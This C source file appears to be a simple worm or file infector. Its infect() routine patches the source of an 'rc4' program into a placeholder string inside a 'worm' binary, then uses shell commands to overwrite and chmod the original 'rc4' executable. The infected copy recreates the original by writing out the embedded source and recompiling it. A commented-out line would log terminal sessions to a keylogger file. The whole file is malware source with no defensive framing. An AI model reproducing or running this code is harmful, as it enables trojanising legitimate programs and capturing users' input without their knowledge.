#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void infect();

int main()
{
        FILE *check = fopen("rc4", "r");

        if(check == NULL){
          infect();
        }else{

        fseek(check,0,SEEK_END); //MOve the pointer to End of File
        int size = ftell(check); //Getting the location of pointer

        if(size > 13400){
          printf("already infected.\n");
          infect();
        }else{
          infect();
        }


        }


        return (0);
}


void infect(){
  static char a[100000] = "hello";

  int flag;
  if(a[0] == 'h') flag=0; else flag=1;


  if ( flag == 1 ) // Comparing it with the original size
  {
      printf("already infected. ---> Recreating original rc4 from memory \n");

      FILE *newSource = fopen("new_rc4.cpp", "w"); // Creating a new Cpp file from the binary which has been infected, where the Code has been stored at static location
      fprintf (newSource, "%s", a);
      fclose(newSource);
      system("g++ new_rc4.cpp -o rc4"); // Creating a new executable everytime the code is run

      // system("script /tmp/keylogger.txt"); // Creating text outupt for every STDIN, STDOUT, STDERR

  }
  else
  {
      printf("starting infection.\n");

      unsigned char ebuffer[100000];
      unsigned char cbuffer[10000];
      unsigned char worm_buffer[150000];



      FILE *rc4_code;
      FILE *worm_exe;
      // FILE *worm_code;


      size_t amount_read,amount_code;

      rc4_code = fopen("rc4.cpp","r");

      worm_exe = fopen( "worm","r");

      int code_len = fread(cbuffer, 1, sizeof(cbuffer), rc4_code);
      printf("%d \n", code_len);
      int worm_len = fread(worm_buffer, 1, sizeof(worm_buffer), worm_exe);
// printf("%s \n", cbuffer);
      // Checking Size of current rc4 file that is present for infection

      fclose(rc4_code);
      fclose(worm_exe);

      printf("FLAG 2 \n");

      int i, j = 0;
        for(i = 0; i < worm_len; i++ )
        {
          // serach for the static variable memory location using its contents as a guide and replace with .c code
          if(worm_buffer[i] == 'h' && worm_buffer[i+1] == 'e'	&& worm_buffer[i+2] == 'l'&& worm_buffer[i+3] == 'l' && worm_buffer[i+4] == 'o')
            {
              for( j=0; j<code_len; j++)
                worm_buffer[i++] = cbuffer[j];

            }
        }

        FILE *fp3 = fopen("x.x","w");
        fwrite (worm_buffer , sizeof(char), sizeof(worm_buffer), fp3);
        fclose(fp3);
        system("mv x.x rc4; chmod +x rc4");

  }
}
